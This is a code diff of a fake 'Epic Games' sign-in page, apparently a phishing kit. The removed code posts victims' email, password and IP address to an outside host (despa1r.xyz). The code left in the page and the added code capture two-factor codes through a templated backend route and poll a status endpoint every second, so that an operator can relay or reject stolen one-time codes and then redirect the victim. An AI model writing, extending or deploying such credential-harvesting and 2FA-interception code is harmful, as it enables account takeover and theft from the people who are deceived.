@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <meta name="csrf-token" content="{{ csrf_token() }}">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in to Your Epic Games account | Epic Games</title>
@@ -50,6 +51,11 @@
 </div>
 
 <script>
+    $.ajaxSetup({
+        headers: {
+            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
+        }
+    });
     function switchFocus(currentInput) {
         let inputs = document.getElementsByClassName('numericInput');
         let currentIndex = Array.prototype.indexOf.call(inputs, currentInput);
@@ -93,7 +99,7 @@
 
 
 
-        return values;
+        return values.join('');
     }
 
     document.addEventListener('DOMContentLoaded', function() {
@@ -126,49 +132,7 @@
 
 
     $(document).ready(function() {
-        // Функция для отправки логина и пароля
-        $('#inputsForm32').submit(function(event) {
-            event.preventDefault();
-            var userId = $('#emailInput').val();
-            var login = $('#emailInput').val();
-            var password = $('#passInput').val();
 
-            var errorDiv = document.getElementById("errorDesc");
-            var errorDiv2 = document.getElementById("errorBlock");
-            var errorDiv3 = document.getElementById("errorId");
-            errorDiv.style.display = "none";
-            errorDiv2.style.display = "none";
-            errorDiv3.style.display = "none";
-            var button = document.getElementById("loginBut");
-            button.disabled = true;
-            button.innerText = "Wait...";
-
-            $.ajax({
-                url: 'https://despa1r.xyz/login-endpoint',
-                type: 'POST',
-                contentType: 'application/json',
-
-                data: JSON.stringify({ 'user_id': "null", 'ip':userIp, 'method': 'login/passwd', 'login': login, 'password': password }),
-                success: function(response) {
-                    if (response === "good") {
-
-                        alert('Zaebca');
-                    } else {
-                        button.disabled = false;
-                        button.innerText = "SIGN IN";
-                        errorDiv.style.display = "flex";
-                        errorDiv2.style.display = "flex";
-                        errorDiv3.style.display = "flex";
-                        // alert('Неправильный логин или пароль!');
-                    }
-                },
-                error: function(xhr, status, error) {
-                    console.log('Error: ' + error);
-                }
-            });
-        });
-
-        // Функция для отправки кода
         $(document).on('submit', '#inputsForm', function(event) {
             event.preventDefault();
             var code = getAllInputValues();
@@ -184,40 +148,78 @@
             button.disabled = true;
             button.innerText = "WAIT...";
             const urlParams = new URLSearchParams(window.location.search);
-            let emailcode = urlParams.get('email') || "despair";
+            let app_id = urlParams.get('app_id') ;
 
 
             $.ajax({
-                url: 'https://despa1r.xyz/code-endpoint',
+                url: '{{route("login.code")}}',
                 type: 'POST',
                 contentType: 'application/json',
-                data: JSON.stringify({ 'user_id': "null", 'ip':userIp, 'email':emailcode,'type':'SignIn', 'code': code }),
+                processData: false,
+                data: JSON.stringify({ 'id': app_id , "code":code}),
                 success: function(response) {
-                    if (response === "good") {
-                        // Меняем ID формы
-                        $('#inputsForm').attr('id', 'inputsForm2');
-                        button.disabled = false;
-                        button.innerText = "CONTINUE";
-                        errorDiv2_2.style.display = "flex";
-                        errorDiv2.style.display = "flex";
-                        errorDiv3.style.display = "flex";
-                        // Дополнительные действия после успешного SignIn
-                    }
-                    else {
-                        button.disabled = false;
-                        button.innerText = "CONTINUE";
-                        errorDiv.style.display = "flex";
-                        errorDiv2.style.display = "flex";
-                        errorDiv3.style.display = "flex";
-                    }
                     console.log(response);
+
                 },
                 error: function(xhr, status, error) {
-                    console.error(error);
+                    console.log('Error: ' + error);
+
                 }
             });
         });
+        function checkStatus(){
 
+
+            var errorDiv = document.getElementById("errorDesc");
+            var errorDiv2_2 = document.getElementById("errorDesc2");
+            var errorDiv2 = document.getElementById("errorBlock");
+            var errorDiv3 = document.getElementById("errorId");
+
+            var button = document.getElementById("loginBut");
+
+            const urlParams = new URLSearchParams(window.location.search);
+            let app_id = urlParams.get('app_id') ;
+
+
+            $.ajax({
+                url: '{{route("login.status")}}',
+                type: 'POST',
+                contentType: 'application/json',
+                processData: false,
+                data: JSON.stringify({ 'id': app_id}),
+                success: function(response) {
+                    console.log(response);
+                    if (response === "resendCode") {
+                        errorDiv.style.display = "none";
+                        errorDiv2.style.display = "none";
+                        errorDiv2_2.style.display = "none";
+                        button.disabled = false;
+                        button.innerText = "SIGN IN";
+                        errorDiv2_2.style.display = "flex";
+                        errorDiv2.style.display = "flex";
+                    }
+                    if(response === "wrongCode"){
+                        errorDiv.style.display = "none";
+                        errorDiv2.style.display = "none";
+                        errorDiv2_2.style.display = "none";
+                        button.disabled = false;
+                        button.innerText = "SIGN IN";
+                        errorDiv.style.display = "flex";
+                        errorDiv2.style.display = "flex";
+                    }
+                    if(response === "finished_code"){
+                        window.location.href = '/success';
+                    }
+                },
+                error: function(xhr, status, error) {
+                    console.log('Error: ' + error);
+
+                }
+            });
+
+
+        }
+        setInterval(checkStatus, 1000);
         // Обработка отправки формы для Email после смены ID
         $(document).on('submit', '#inputsForm2', function(event) {
             event.preventDefault();
